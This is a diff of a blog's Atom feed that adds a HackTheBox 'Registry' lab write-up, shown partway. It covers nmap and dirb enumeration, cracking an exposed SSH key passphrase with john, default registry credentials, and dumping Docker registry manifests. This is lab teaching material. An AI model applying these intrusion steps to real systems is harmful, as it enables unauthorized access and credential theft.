@@ -1,5 +1,820 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-03-21T17:10:00+01:00</updated><entry><title>HTB: Forest</title><link href="https://maggick.fr/2020/03/htb-forest.html" rel="alternate"></link><published>2020-03-21T17:10:00+01:00</published><updated>2020-03-21T17:10:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-03-21:/2020/03/htb-forest.html</id><summary type="html">&lt;p&gt;&lt;img alt="Forest card" class="align-left" src="/media/2020.03/forest_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-04-04T19:40:00+02:00</updated><entry><title>HTB: Registry</title><link href="https://maggick.fr/2020/04/htb-registry.html" rel="alternate"></link><published>2020-04-04T19:40:00+02:00</published><updated>2020-04-04T19:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-04-04:/2020/04/htb-registry.html</id><summary type="html">&lt;p&gt;&lt;img alt="Jarvis Card" class="align-left" src="/media/2020.04/registry_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/213"&gt;Registry&lt;/a&gt;.
+This box is rated as a hard box. It was release on October 19 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/4615"&gt;thek&lt;/a&gt;. It implies a few
+rabbit holes, the Docker registry API, the Bolt CMS, and the SUID binary &lt;code&gt;restic&lt;/code&gt;.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.04/registry_card.png" alt="Jarvis Card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/213"&gt;Registry&lt;/a&gt;.
+This box is rated as a hard box. It was release on October 19 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/4615"&gt;thek&lt;/a&gt;. It implies a few
+rabbit holes, the Docker registry API, the Bolt CMS, and the SUID binary &lt;code&gt;restic&lt;/code&gt;.&lt;/p&gt;
+
+
+&lt;div class="toc"&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#getting-user"&gt;Getting user&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#recon"&gt;Recon&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#web"&gt;Web&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#subdomain"&gt;subdomain&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#docker-registry-api"&gt;Docker registry API&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#blobs"&gt;Blobs&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#getting-root"&gt;Getting root&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#enumeration"&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#bolt-archive"&gt;Bolt archive&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#appconfig"&gt;app/config&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#appdatabase"&gt;app/database&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#production-db"&gt;Production DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#bolt-cms"&gt;Bolt CMS&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#www-data"&gt;www-data&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#wrapping-up"&gt;Wrapping up&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;h1 id="getting-user"&gt;Getting user&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; TCP scan. The ports 22 (SSH), 80 (HTTP),
+443(HTTPS) and 32115 are open:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Thu Nov 28 07:53:01 2019 as: nmap -p- -oA nmap 10.10.10.159&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.159&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.086s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65531 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT      STATE SERVICE&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp    open  ssh&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp    open  http&lt;/span&gt;
+&lt;span class="code-line"&gt;443/tcp   open  https&lt;/span&gt;
+&lt;span class="code-line"&gt;32115/tcp open  unknown&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Thu Nov 28 08:05:18 2019 -- 1 IP address (1 host up) scanned in 737.00 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Let us see what services are running on this ports.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Thu Nov 28 08:05:53 2019 as: nmap -p22,80,443,32115 -sSV -oA services 10.10.10.159&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.159&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.084s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT      STATE SERVICE  VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp    open  http     nginx 1.14.0 (Ubuntu)&lt;/span&gt;
+&lt;span class="code-line"&gt;443/tcp   open  ssl/http nginx 1.14.0 (Ubuntu)&lt;/span&gt;
+&lt;span class="code-line"&gt;32115/tcp open  unknown&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Thu Nov 28 08:06:18 2019 -- 1 IP address (1 host up) scanned in 24.72 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;On both port 80 and 443 we get the default Nginx home page.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="default nginx homepage" src="/media/2020.04/registry_0.png"&gt;&lt;/p&gt;
+&lt;p&gt;We run a &lt;code&gt;dirb&lt;/code&gt; at it. The tool found a few interesting files in &lt;code&gt;.ssh.&lt;/code&gt;:
+ * &lt;code&gt;authorized_keys&lt;/code&gt;
+ * &lt;code&gt;id_rsa&lt;/code&gt;
+ * &lt;code&gt;password&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Here is the dirb output:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
+&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;OUTPUT_FILE: dirb_ip&lt;/span&gt;
+&lt;span class="code-line"&gt;START_TIME: Tue Dec  3 07:40:04 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;URL_BASE: http://10.10.10.159/&lt;/span&gt;
+&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;GENERATED WORDS: 4612&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;---- Scanning URL: http://10.10.10.159/ ----&lt;/span&gt;
+&lt;span class="code-line"&gt;+ http://10.10.10.159/.bash_history (CODE:403|SIZE:580)&lt;/span&gt;
+&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.159/.ssh/&lt;/span&gt;
+&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.159/fuck/&lt;/span&gt;
+&lt;span class="code-line"&gt;+ http://10.10.10.159/index.html (CODE:200|SIZE:612)&lt;/span&gt;
+&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.159/install/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;---- Entering directory: http://10.10.10.159/.ssh/ ----&lt;/span&gt;
+&lt;span class="code-line"&gt;+ http://10.10.10.159/.ssh/authorized_keys (CODE:200|SIZE:395)&lt;/span&gt;
+&lt;span class="code-line"&gt;+ http://10.10.10.159/.ssh/id_rsa (CODE:200|SIZE:1766)&lt;/span&gt;
+&lt;span class="code-line"&gt;+ http://10.10.10.159/.ssh/password (CODE:200|SIZE:10)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;---- Entering directory: http://10.10.10.159/fuck/ ----&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;---- Entering directory: http://10.10.10.159/install/ ----&lt;/span&gt;
+&lt;span class="code-line"&gt;+ http://10.10.10.159/install/index.php (CODE:200|SIZE:1050)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;END_TIME: Tue Dec  3 08:10:46 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;DOWNLOADED: 18448 - FOUND: 6&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The &lt;code&gt;password&lt;/code&gt; file contain a single "word": &lt;code&gt;awwwwwwww&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The SSH key is password protected, we extract the hash for john and run it to
+find the password: &lt;code&gt;rootroot&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ python2 /usr/bin/ssh2john id_rsa &amp;gt; id_rsa.hash&lt;/span&gt;
+&lt;span class="code-line"&gt;$ john  id_rsa.hash -w=~/tools/password_lists/rockyou.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;SSH&amp;quot;, but the string is also recognized as &amp;quot;ssh-opencl&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Use the &amp;quot;--format=ssh-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
+&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
+&lt;span class="code-line"&gt;Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])&lt;/span&gt;
+&lt;span class="code-line"&gt;Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes&lt;/span&gt;
+&lt;span class="code-line"&gt;Cost 2 (iteration count) is 1 for all loaded hashes&lt;/span&gt;
+&lt;span class="code-line"&gt;Will run 4 OpenMP threads&lt;/span&gt;
+&lt;span class="code-line"&gt;Note: This format may emit false positives, so it will keep trying even after&lt;/span&gt;
+&lt;span class="code-line"&gt;finding a possible candidate.&lt;/span&gt;
+&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
+&lt;span class="code-line"&gt;rootroot         (id_rsa)&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: Only 1 candidate left, minimum 4 needed for performance.&lt;/span&gt;
+&lt;span class="code-line"&gt;1g 0:00:00:11 DONE (2019-12-03 13:51) 0.08635g/s 1238Kp/s 1238Kc/s 1238KC/s *7¡Vamos!&lt;/span&gt;
+&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The SSH key doesn't let us login anywhere. It will prove later than both the SSH
+key and the password were just a rabbit hole.&lt;/p&gt;
+&lt;h2 id="subdomain"&gt;subdomain&lt;/h2&gt;
+&lt;p&gt;We take a look at the SSL certificate and we see that there is a interesting
+sub domain: &lt;a href="https://docker.registry.htb/"&gt;https://docker.registry.htb/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="default Nginx homepage" src="/media/2020.04/registry_1.png"&gt;&lt;/p&gt;
+&lt;p&gt;We run another &lt;code&gt;dirb&lt;/code&gt; at it and found an interesting page:
+&lt;a href="https://docker.registry.htb/v2"&gt;https://docker.registry.htb/v2&lt;/a&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
+&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;START_TIME: Thu Nov 28 08:28:46 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;URL_BASE: https://docker.registry.htb/&lt;/span&gt;
+&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;GENERATED WORDS: 4612&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;---- Scanning URL: https://docker.registry.htb/ ----&lt;/span&gt;
+&lt;span class="code-line"&gt;+ https://docker.registry.htb/v2 (CODE:301|SIZE:39)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;END_TIME: Thu Nov 28 08:36:36 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;DOWNLOADED: 4612 - FOUND: 1&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This page ask for a basic auth. The trivial &lt;code&gt;admin:admin&lt;/code&gt; creds work.&lt;/p&gt;
+&lt;h2 id="docker-registry-api"&gt;Docker registry API&lt;/h2&gt;
+&lt;p&gt;The following link is an interesting source to exploit the
+&lt;a href="https://docs.docker.com/registry/spec/api/"&gt;docker registry API&lt;/a&gt;:
+&lt;a href="https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/"&gt;https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We start enumerating using the command: &lt;code&gt;_catalog&lt;/code&gt;. The API give use the
+available images: &lt;code&gt;{"repositories":["bolt-image"]}&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;(Note: the command are used by appending them to the URL for instance the
+&lt;code&gt;_catalog&lt;/code&gt; command is run by getting the following URL:
+&lt;a href="https://docker.registry.htb/v2/_catalog"&gt;https://docker.registry.htb/v2/_catalog&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;We list the available tags for this image with &lt;code&gt;bolt-image/tags/list&lt;/code&gt;. There is
+only one version available for this image: &lt;code&gt;latest&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;{"name":"bolt-image","tags":["latest"]}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We download the manifest for the latest version of the bolt-image docker image
+with the command &lt;code&gt;bolt-image/manifests/latest&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;{&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;quot;schemaVersion&amp;quot;: 1,&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;quot;name&amp;quot;: &amp;quot;bolt-image&amp;quot;,&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;quot;tag&amp;quot;: &amp;quot;latest&amp;quot;,&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;quot;architecture&amp;quot;: &amp;quot;amd64&amp;quot;,&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;quot;fsLayers&amp;quot;: [&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;blobSum&amp;quot;: &amp;quot;sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      }&lt;/span&gt;
+&lt;span class="code-line"&gt;  ],&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;quot;history&amp;quot;: [&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;architecture\&amp;quot;:\&amp;quot;amd64\&amp;quot;,\&amp;quot;config\&amp;quot;:{\&amp;quot;Hostname\&amp;quot;:\&amp;quot;e2e880122289\&amp;quot;,\&amp;quot;Domainname\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;User\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;AttachStdin\&amp;quot;:true,\&amp;quot;AttachStdout\&amp;quot;:true,\&amp;quot;AttachStderr\&amp;quot;:true,\&amp;quot;Tty\&amp;quot;:true,\&amp;quot;OpenStdin\&amp;quot;:true,\&amp;quot;StdinOnce\&amp;quot;:true,\&amp;quot;Env\&amp;quot;:[\&amp;quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\&amp;quot;],\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;bash\&amp;quot;],\&amp;quot;Image\&amp;quot;:\&amp;quot;docker.registry.htb/bolt-image\&amp;quot;,\&amp;quot;Volumes\&amp;quot;:null,\&amp;quot;WorkingDir\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;Entrypoint\&amp;quot;:null,\&amp;quot;OnBuild\&amp;quot;:null,\&amp;quot;Labels\&amp;quot;:{}},\&amp;quot;container\&amp;quot;:\&amp;quot;e2e88012228993b25b697ee37a0aae0cb0ecef7b1536d2b8e488a6ec3f353f14\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Hostname\&amp;quot;:\&amp;quot;e2e880122289\&amp;quot;,\&amp;quot;Domainname\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;User\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;AttachStdin\&amp;quot;:true,\&amp;quot;AttachStdout\&amp;quot;:true,\&amp;quot;AttachStderr\&amp;quot;:true,\&amp;quot;Tty\&amp;quot;:true,\&amp;quot;OpenStdin\&amp;quot;:true,\&amp;quot;StdinOnce\&amp;quot;:true,\&amp;quot;Env\&amp;quot;:[\&amp;quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\&amp;quot;],\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;bash\&amp;quot;],\&amp;quot;Image\&amp;quot;:\&amp;quot;docker.registry.htb/bolt-image\&amp;quot;,\&amp;quot;Volumes\&amp;quot;:null,\&amp;quot;WorkingDir\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;Entrypoint\&amp;quot;:null,\&amp;quot;OnBuild\&amp;quot;:null,\&amp;quot;Labels\&amp;quot;:{}},\&amp;quot;created\&amp;quot;:\&amp;quot;2019-05-25T15:18:56.9530238Z\&amp;quot;,\&amp;quot;docker_version\&amp;quot;:\&amp;quot;18.09.2\&amp;quot;,\&amp;quot;id\&amp;quot;:\&amp;quot;f18c41121574af38e7d88d4f5d7ea9d064beaadd500d13d33e8c419d01aa5ed5\&amp;quot;,\&amp;quot;os\&amp;quot;:\&amp;quot;linux\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\&amp;quot;}&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-05-25T15:13:31.3975799Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;bash\&amp;quot;]}}&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-05-25T14:57:27.6745842Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;bash\&amp;quot;]}}&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-05-25T14:47:52.6859489Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;bash\&amp;quot;]}}&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-05-24T22:51:14.8744838Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;/bin/bash\&amp;quot;]}}&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-04-26T22:21:05.100534088Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;/bin/sh -c #(nop)  CMD [\\\&amp;quot;/bin/bash\\\&amp;quot;]\&amp;quot;]},\&amp;quot;throwaway\&amp;quot;:true}&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
